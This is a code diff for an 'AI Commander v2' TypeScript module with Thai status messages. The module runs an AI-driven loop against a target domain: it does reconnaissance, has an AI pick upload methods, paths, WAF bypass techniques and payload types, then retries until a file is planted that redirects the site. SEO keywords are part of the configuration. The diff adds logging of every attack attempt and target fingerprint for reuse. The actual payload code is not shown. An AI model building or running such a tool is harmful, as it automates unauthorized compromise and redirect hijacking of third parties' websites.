@@ -842,16 +1300,15 @@ async function aiLearn(
     }
   }
 
-  // Identify exhausted methods/paths
   Array.from(failsByMethod.entries()).forEach(([method, count]) => {
-    if (count >= 3) lessons.push(`Method "${method}" has failed ${count} times — avoid it`);
+    if (count >= 3) lessons.push(`Method "${method}" failed ${count}x — avoid it`);
   });
   Array.from(failsByPath.entries()).forEach(([path, count]) => {
-    if (count >= 3) lessons.push(`Path "${path}" has failed ${count} times — try different path`);
+    if (count >= 3) lessons.push(`Path "${path}" failed ${count}x — try different path`);
   });
 
   const summary = lessons.join(". ");
-  
+
   onEvent?.({
     type: "learn", iteration, maxIterations,
     detail: `📚 AI เรียนรู้: ${summary}`,
@@ -862,7 +1319,7 @@ async function aiLearn(
 }
 
 // ═══════════════════════════════════════════════════════════════
-//  MAIN: AI COMMANDER LOOP
+//  MAIN: AI COMMANDER LOOP v2
 // ═══════════════════════════════════════════════════════════════
 
 export async function runAiCommander(config: AiCommanderConfig): Promise<AiCommanderResult> {
@@ -873,21 +1330,28 @@ export async function runAiCommander(config: AiCommanderConfig): Promise<AiComma
     timeoutPerAttempt = 15000,
     seoKeywords = [],
     onEvent,
+    preAnalysis = null,
+    userId,
+    pipelineType = "manual",
+    sessionId = randomStr(16),
   } = config;
 
   const startTime = Date.now();
   const decisions: AiDecision[] = [];
   const executionResults: ExecutionResult[] = [];
   let reconData: ReconData | null = null;
+  let historyInsights: HistoryInsight | null = null;
 
   onEvent?.({
     type: "recon", iteration: 0, maxIterations,
-    detail: `🚀 AI Commander เริ่มทำงาน — target: ${targetDomain}, redirect: ${redirectUrl}`,
+    detail: `🚀 AI Commander v2 เริ่มทำงาน — target: ${targetDomain}, redirect: ${redirectUrl}`,
   });
 
-  // ─── Phase 1: RECON ───
+  // ─── Phase 0: LOAD HISTORY ───
   try {
-    reconData = await performRecon(targetDomain, onEvent);
+    // Do recon first to get server info for history query
+    reconData = await performRecon(targetDomain, preAnalysis, onEvent);
+    historyInsights = await loadHistoryInsights(reconData, onEvent);
   } catch (e: any) {
     onEvent?.({
       type: "error", iteration: 0, maxIterations,
@@ -896,28 +1360,71 @@ export async function runAiCommander(config: AiCommanderConfig): Promise<AiComma
     return {
       success: false, iterations: 0, successfulMethod: null, uploadedUrl: null,
       redirectVerified: false, decisions, executionResults, reconData, totalDurationMs: Date.now() - startTime,
+      historyInsights: null,
     };
   }
 
-  // ─── Phase 2-6: AI OODA LOOP ───
+  // ─── OODA LOOP ───
   for (let iteration = 1; iteration <= maxIterations; iteration++) {
-    // 2. DECIDE
-    const decision = await aiDecide(reconData, redirectUrl, iteration, executionResults, seoKeywords, onEvent, maxIterations);
+    // DECIDE
+    const decision = await aiDecide(reconData, redirectUrl, iteration, executionResults, seoKeywords, historyInsights, preAnalysis, onEvent, maxIterations);
     decisions.push(decision);
 
-    // 3. EXECUTE
+    // EXECUTE
     const execResult = await executeDecision(reconData, decision, timeoutPerAttempt, onEvent, maxIterations);
     executionResults.push(execResult);
 
-    // 4. CHECK SUCCESS
+    // SAVE TO DB (async, don't block)
+    if (userId) {
+      saveAttackDecision({
+        userId,
+        targetDomain,
+        targetIp: reconData.ip,
+        serverType: reconData.serverType,
+        serverVersion: reconData.responseHeaders["server"] || null,
+        cms: reconData.cms,
+        cmsVersion: reconData.cmsVersion,
+        language: reconData.language,
+        os: reconData.os,
+        waf: reconData.waf,
+        wafStrength: reconData.wafStrength,
+        hostingProvider: reconData.hostingProvider,
+        controlPanel: reconData.controlPanel,
+        sslEnabled: reconData.sslEnabled,
+        redirectUrl,
+        method: decision.method,
+        filename: decision.filename,
+        uploadPath: decision.uploadPath,
+        contentType: decision.contentType,
+        httpMethod: decision.httpMethod,
+        bypassTechnique: decision.bypassTechnique,
+        payloadType: decision.payloadType,
+        success: execResult.success,
+        statusCode: execResult.statusCode,
+        errorMessage: execResult.error,
+        fileVerified: execResult.fileVerified,
+        redirectVerified: execResult.redirectVerified,
+        uploadedUrl: execResult.uploadedUrl,
+        durationMs: execResult.durationMs,
+        aiReasoning: decision.reasoning,
+        aiConfidence: decision.confidence,
+        iteration,
+        preAnalysisData: preAnalysis ? JSON.stringify(preAnalysis.aiStrategy) : null,
+        pipelineType,
+        sessionId,
+      }).catch(() => {}); // fire-and-forget
+    }
+
+    // CHECK SUCCESS
     if (execResult.success) {
       onEvent?.({
         type: "success", iteration, maxIterations,
-        detail: `🎯 สำเร็จ! File uploaded ที่ ${execResult.uploadedUrl} ด้วย method "${decision.method}" (${decision.bypassTechnique}) — ใช้ ${iteration} iterations`,
+        detail: `🎯 สำเร็จ! File uploaded ที่ ${execResult.uploadedUrl} ด้วย method "${decision.method}" (${decision.bypassTechnique}, ${decision.payloadType}) — ใช้ ${iteration} iterations`,
         data: {
           uploadedUrl: execResult.uploadedUrl,
           method: decision.method,
           bypass: decision.bypassTechnique,
+          payloadType: decision.payloadType,
           redirectVerified: execResult.redirectVerified,
           iterations: iteration,
         },
@@ -926,30 +1433,30 @@ export async function runAiCommander(config: AiCommanderConfig): Promise<AiComma
       return {
         success: true,
         iterations: iteration,
-        successfulMethod: `${decision.method} (${decision.bypassTechnique})`,
+        successfulMethod: `${decision.method} (${decision.bypassTechnique}, ${decision.payloadType})`,
         uploadedUrl: execResult.uploadedUrl,
         redirectVerified: execResult.redirectVerified,
         decisions,
         executionResults,
         reconData,
         totalDurationMs: Date.now() - startTime,
+        historyInsights,
       };
     }
 
-    // 5. LEARN
+    // LEARN
     await aiLearn(reconData, execResult, executionResults, iteration, maxIterations, onEvent);
 
-    // 6. ADAPT (implicit — next iteration's aiDecide will use updated history)
+    // ADAPT
     onEvent?.({
       type: "adapt", iteration, maxIterations,
       detail: `🔄 AI ปรับ strategy — เตรียม iteration ${iteration + 1}/${maxIterations}...`,
     });
 
-    // Small delay between iterations to avoid rate limiting
     await new Promise(r => setTimeout(r, 1000));
   }
 
-  // Exhausted all iterations
+  // Exhausted
   onEvent?.({
     type: "exhausted", iteration: maxIterations, maxIterations,
     detail: `⚠️ AI Commander หมด iterations (${maxIterations}) — ไม่สามารถ upload ได้สำเร็จ`,
@@ -958,6 +1465,7 @@ export async function runAiCommander(config: AiCommanderConfig): Promise<AiComma
       methodsTried: Array.from(new Set(decisions.map(d => d.method))),
       pathsTried: Array.from(new Set(decisions.map(d => d.uploadPath))),
       bypassesTried: Array.from(new Set(decisions.map(d => d.bypassTechnique))),
+      payloadTypesTried: Array.from(new Set(decisions.map(d => d.payloadType))),
     },
   });
 
@@ -971,5 +1479,6 @@ export async function runAiCommander(config: AiCommanderConfig): Promise<AiComma
     executionResults,
     reconData,
     totalDurationMs: Date.now() - startTime,
+    historyInsights,
   };
 }
